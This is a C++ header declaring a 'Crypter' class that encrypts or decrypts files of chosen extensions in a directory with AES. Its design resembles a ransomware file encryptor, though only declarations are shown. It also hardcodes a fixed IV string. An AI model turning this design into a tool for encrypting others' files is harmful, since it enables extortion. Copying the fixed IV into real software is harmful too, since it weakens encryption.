#ifndef CRYPTER_H
#define CRYPTER_H

#include <string>
#include <vector>

class Crypter {
public:
    Crypter(std::string  directoryPath,std::string key);
    void encrypt();
    void decrypt();
    ~Crypter();

private:

    std::string key_ ;
    std::string iv_ = "BLABLABLABLABLAA";
    std::string directoryPath_ ;


    bool isTargetExtension(const std::string& filePath);
    std::string encryptAES(const std::string& input);
    std::string decryptAES(const std::string& encryptedText);
    std::string readFromFile(const std::string& filePath);
    void writeToFile(const std::string& filePath, const std::string& content);
    void clearMemory(void* ptr, size_t size);
};

#endif // CRYPTER_H



